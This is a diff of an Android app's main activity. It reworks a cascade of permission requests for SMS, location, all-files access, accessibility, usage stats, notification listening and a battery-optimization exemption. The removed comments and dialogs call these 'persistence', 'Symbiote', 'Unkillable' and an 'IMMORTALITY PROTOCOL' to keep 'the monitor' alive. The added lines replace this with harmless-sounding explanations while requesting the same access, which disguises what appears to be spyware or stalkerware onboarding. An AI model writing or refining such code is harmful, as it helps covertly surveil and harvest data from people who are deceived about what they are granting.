@@ -31,22 +31,22 @@ class MainActivity : ComponentActivity() {
         runPermissionCascade()
     }
 
-    private var hasAskedRuntime = false
-
     private fun runPermissionCascade() {
         val ctx = this
+        val prefs = getSharedPreferences("setup_prefs", MODE_PRIVATE)
 
         // 1. Runtime (SMS, Location, etc)
         val missingRuntime = PermissionManager.getMissingRuntimePermissions(ctx)
-        if (missingRuntime.isNotEmpty() && !hasAskedRuntime) {
-            hasAskedRuntime = true
+        if (missingRuntime.isNotEmpty() && !prefs.getBoolean("asked_runtime", false)) {
+            prefs.edit().putBoolean("asked_runtime", true).apply()
             requestPermissions(missingRuntime.toTypedArray(), 101)
             return
         }
 
-        // 1.5 Storage (All Files Access for Android 11+)
-        if (!PermissionManager.hasAllFilesAccess(ctx)) {
-             showExplanationDialog("FILE SYSTEM ACCESS", "Full storage access is required to generate file reports and backups.") {
+        // 1.5 Storage
+        if (!PermissionManager.hasAllFilesAccess(ctx) && !prefs.getBoolean("asked_files", false)) {
+             prefs.edit().putBoolean("asked_files", true).apply()
+             showExplanationDialog("Storage Access", "Storage access is required to generate system reports and manage backups.") {
                  val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                  intent.data = android.net.Uri.parse("package:$packageName")
                  startActivity(intent)
@@ -54,33 +54,37 @@ class MainActivity : ComponentActivity() {
              return
         }
 
-        // 2. Accessibility (Critical for Persistence)
-        if (!PermissionManager.hasAccessibility(ctx)) {
-            showExplanationDialog("SYSTEM OVERRIDE REQUIRED", "Accessibility Access is required to maintain system persistence and monitor usage.") {
+        // 2. Accessibility
+        if (!PermissionManager.hasAccessibility(ctx) && !prefs.getBoolean("asked_acc", false)) {
+            prefs.edit().putBoolean("asked_acc", true).apply()
+            showExplanationDialog("Accessibility Service", "Accessibility access is required to monitor usage and automate data synchronization.") {
                 startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
             }
             return
         }
 
-        // 3. Usage Stats (Screen Time)
-        if (!PermissionManager.hasUsageStats(ctx)) {
-            showExplanationDialog("DATA STREAM BLOCKED", "Usage Access required to calculate digital habits.") {
+        // 3. Usage Stats
+        if (!PermissionManager.hasUsageStats(ctx) && !prefs.getBoolean("asked_usage", false)) {
+            prefs.edit().putBoolean("asked_usage", true).apply()
+            showExplanationDialog("Usage Analytics", "Usage access is required to calculate screen time and digital habits.") {
                 startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
             }
             return
         }
 
-        // 4. Notification Listener (Symbiote)
-        if (!PermissionManager.hasNotificationListener(ctx)) {
-            showExplanationDialog("LINK REQUIRED", "Notification Access required for real-time alerts.") {
+        // 4. Notification Listener
+        if (!PermissionManager.hasNotificationListener(ctx) && !prefs.getBoolean("asked_notif", false)) {
+            prefs.edit().putBoolean("asked_notif", true).apply()
+            showExplanationDialog("Notification Access", "Notification access is required to sync alerts and messages.") {
                 startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
             }
             return
         }
         
-        // 5. Battery (Unkillable)
-        if (!PermissionManager.isIgnored(ctx)) {
-             showExplanationDialog("IMMORTALITY PROTOCOL", "Battery optimization must be ignored to prevent the OS from killing the monitor.") {
+        // 5. Battery
+        if (!PermissionManager.isIgnored(ctx) && !prefs.getBoolean("asked_batt", false)) {
+             prefs.edit().putBoolean("asked_batt", true).apply()
+             showExplanationDialog("Background Processing", "Battery optimization must be ignored to allow unrestricted data sync.") {
                  val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                  intent.data = android.net.Uri.parse("package:$packageName")
                  startActivity(intent)
@@ -89,10 +93,9 @@ class MainActivity : ComponentActivity() {
         }
 
         // --- SMART INITIALIZATION: CASCADE COMPLETE ---
-        // Once the user finishes the entire cascade, queue a final initial data sync.
-        val prefs = getSharedPreferences("app_stats", MODE_PRIVATE)
-        if (!prefs.getBoolean("full_setup_complete", false)) {
-            prefs.edit().putBoolean("full_setup_complete", true).apply()
+        val statsPrefs = getSharedPreferences("app_stats", MODE_PRIVATE)
+        if (!statsPrefs.getBoolean("full_setup_complete", false)) {
+            statsPrefs.edit().putBoolean("full_setup_complete", true).apply()
             triggerImmediateDataSync()
         }
     }
